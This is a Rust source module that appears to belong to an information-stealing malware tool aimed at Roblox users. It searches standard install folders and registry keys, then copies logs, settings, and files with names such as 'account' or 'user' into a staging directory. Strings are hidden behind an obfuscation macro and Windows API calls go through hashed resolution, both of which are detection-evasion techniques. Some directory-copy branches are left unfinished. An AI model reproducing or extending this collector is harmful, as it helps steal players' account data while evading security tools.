use crate::sprotect;
use crate::api_resolve::HashedAPIs;
use std::path::PathBuf;
use std::fs;
use winapi::um::winreg::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::KEY_READ;
use winapi::shared::minwindef::DWORD;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\Roblox");
    std::fs::create_dir_all(&output_dir)?;

    let roblox_paths = detect_roblox_paths().await;
    
    for roblox_path in roblox_paths {
        extract_roblox_data(&roblox_path, &output_dir).await.ok();
    }

    extract_roblox_registry(&output_dir).await.ok();

    Ok(())
}

async fn detect_roblox_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let localappdata = std::env::var(sprotect!("LOCALAPPDATA")).unwrap_or_default();
    
    let roblox_locations = vec![
        format!("{}{}", localappdata, sprotect!("\\Roblox")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Roblox")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Roblox")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Roblox Studio")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Roblox Studio")),
        sprotect!("C:\\Program Files\\Roblox"),
        sprotect!("C:\\Program Files (x86)\\Roblox"),
    ];

    for path_str in roblox_locations {
        let path = PathBuf::from(path_str);
        if path.exists() {
            paths.push(path);
        }
    }

    paths
}

async fn extract_roblox_data(roblox_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let roblox_name = roblox_path.file_name().unwrap_or_default().to_string_lossy();
    let roblox_output = format!("{}\\{}", output_dir, roblox_name);
    std::fs::create_dir_all(&roblox_output)?;

    extract_roblox_versions(roblox_path, &roblox_output).await?;
    extract_roblox_logs(roblox_path, &roblox_output).await?;
    extract_roblox_content(roblox_path, &roblox_output).await?;
    
    Ok(())
}

async fn extract_roblox_versions(roblox_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let versions_path = roblox_path.join(sprotect!("Versions"));
    if versions_path.exists() {
        let versions_output = format!("{}{}", output_dir, sprotect!("\\Versions"));
        std::fs::create_dir_all(&versions_output)?;

        if let Ok(entries) = fs::read_dir(&versions_path) {
            for entry in entries.flatten() {
                let version_path = entry.path();
                if version_path.is_dir() {
                    let version_name = version_path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                    let version_output = format!("{}\\{}", versions_output, version_name);
                    
                    extract_version_files(&version_path, &version_output).await?;
                }
            }
        }
    }
    Ok(())
}

async fn extract_version_files(version_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(output_dir)?;

    let important_files = vec![
        sprotect!("RobloxPlayerBeta.exe"),
        sprotect!("RobloxStudioBeta.exe"),
        sprotect!("ClientSettings\\ClientAppSettings.json"),
        sprotect!("PlatformContent\\pc\\textures"),
        sprotect!("ExtraContent"),
    ];

    for file_path in important_files {
        let full_path = version_path.join(&file_path);
        if full_path.exists() {
            if full_path.is_file() {
                let dest_path = format!("{}\\{}", output_dir, file_path.replace("\\", "_"));
                fs::copy(&full_path, dest_path).ok();
            } else if full_path.is_dir() {
                let dest_dir = format!("{}\\{}", output_dir, file_path.replace("\\", "_"));
                copy_roblox_directory(&full_path, &dest_dir).await?;
            }
        }
    }

    Ok(())
}

async fn extract_roblox_logs(roblox_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let logs_path = roblox_path.join(sprotect!("logs"));
    if logs_path.exists() {
        let logs_output = format!("{}{}", output_dir, sprotect!("\\logs"));
        copy_roblox_directory(&logs_path, &logs_output).await?;
    }
    Ok(())
}

async fn extract_roblox_content(roblox_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let content_dirs = vec![
        sprotect!("content"),
        sprotect!("GlobalSettings_13.xml"),
        sprotect!("AppSettings.xml"),
    ];

    for content_item in content_dirs {
        let content_path = roblox_path.join(&content_item);
        if content_path.exists() {
            if content_path.is_file() {
                let dest_path = format!("{}\\{}", output_dir, content_item);
                fs::copy(&content_path, dest_path).ok();
            } else if content_path.is_dir() {
                let dest_dir = format!("{}\\{}", output_dir, content_item);
                copy_selective_roblox_files(&content_path, &dest_dir).await?;
            }
        }
    }

    Ok(())
}

async fn extract_roblox_registry(output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let registry_output = format!("{}{}", output_dir, sprotect!("\\Registry"));
    std::fs::create_dir_all(&registry_output)?;

    unsafe {
        let registry_keys = vec![
            (HKEY_LOCAL_MACHINE, sprotect!("SOFTWARE\\Roblox Corporation")),
            (HKEY_LOCAL_MACHINE, sprotect!("SOFTWARE\\WOW6432Node\\Roblox Corporation")),
            (HKEY_CURRENT_USER, sprotect!("SOFTWARE\\Roblox Corporation")),
            (HKEY_CURRENT_USER, sprotect!("SOFTWARE\\Classes\\roblox-player")),
            (HKEY_CURRENT_USER, sprotect!("SOFTWARE\\Classes\\roblox-studio")),
        ];

        let mut registry_info = Vec::new();

        for (hkey, subkey) in registry_keys {
            if let Some(key_info) = read_registry_key(hkey, &subkey).await {
                registry_info.push(format!("{}:\\{}", if hkey == HKEY_LOCAL_MACHINE { sprotect!("HKEY_LOCAL_MACHINE") } else { sprotect!("HKEY_CURRENT_USER") }, subkey));
                registry_info.extend(key_info);
                registry_info.push(String::new());
            }
        }

        if !registry_info.is_empty() {
            let registry_file = format!("{}{}", registry_output, sprotect!("\\roblox_registry.txt"));
            fs::write(registry_file, registry_info.join("\n")).ok();
        }
    }

    Ok(())
}

async fn read_registry_key(hkey: winapi::shared::minwindef::HKEY, subkey: &str) -> Option<Vec<String>> {
    unsafe {
        let mut key: *mut std::ffi::c_void = std::ptr::null_mut();
        let subkey_wide: Vec<u16> = subkey.encode_utf16().chain(std::iter::once(0)).collect();

        if HashedAPIs::reg_open_key_ex_w(
            hkey as *mut _,
            subkey_wide.as_ptr(),
            0,
            KEY_READ,
            &mut key
        ) == 0 {
            let mut info = Vec::new();
            let mut index = 0;

            loop {
                let mut subkey_name = [0u16; 256];
                let mut subkey_size = subkey_name.len() as DWORD;

                if HashedAPIs::reg_enum_key_ex_w(
                    key,
                    index,
                    subkey_name.as_mut_ptr(),
                    &mut subkey_size,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                ) != 0 {
                    break;
                }

                let subkey_str = String::from_utf16_lossy(&subkey_name[..subkey_size as usize]);
                info.push(format!("  {}: {}", sprotect!("Subkey"), subkey_str));
                
                index += 1;
            }

            HashedAPIs::reg_close_key(key);
            
            if !info.is_empty() {
                return Some(info);
            }
        }
    }
    None
}

async fn copy_roblox_directory(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                let dest_path = format!("{}\\{}", dest_dir, file_name);
                fs::copy(&path, dest_path).ok();
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                let new_dest = format!("{}\\{}", dest_dir, dir_name);
                
            }
        }
    }
    Ok(())
}

async fn copy_selective_roblox_files(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_roblox_important_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_roblox_important_dir(&dir_name) {
                    let new_dest = format!("{}\\{}", dest_dir, dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

fn is_roblox_important_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let important_extensions = [sprotect!(".json"), sprotect!(".xml"), sprotect!(".txt"), sprotect!(".log"), sprotect!(".cfg"), sprotect!(".ini")];
    let important_keywords = [sprotect!("setting"), sprotect!("config"), sprotect!("user"), sprotect!("account"), sprotect!("client"), sprotect!("global")];
    
    important_extensions.iter().any(|ext| filename_lower.ends_with(ext)) ||
    important_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_roblox_important_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let important_dirs = [sprotect!("setting"), sprotect!("config"), sprotect!("user"), sprotect!("client"), sprotect!("content"), sprotect!("log")];
    
    important_dirs.iter().any(|dir| dirname_lower.contains(dir))
}